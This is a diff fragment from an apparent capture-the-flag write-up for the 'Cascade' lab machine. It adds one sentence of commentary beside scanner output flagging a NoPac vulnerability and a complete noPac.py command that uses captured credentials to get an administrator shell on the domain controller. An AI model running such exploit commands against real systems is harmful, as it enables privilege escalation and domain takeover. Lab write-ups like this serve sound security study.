@@ -189,7 +189,7 @@ NOPAC       10.129.18.9     445    CASC-DC1
 NOPAC       10.129.18.9     445    CASC-DC1         VULNERABLE
 NOPAC       10.129.18.9     445    CASC-DC1         Next step: https://github.com/Ridter/noPac
 ```
-
+It is vulnerable to NoPac i knew to test for this based on past experience with a similar version of windows
 
 ```python
 python3 noPac.py cascade.local/r.thompson:'rY4n5eva' -dc-ip 10.129.18.9 -dc-host casc-dc1 -shell --impersonate administrator -use-ldap
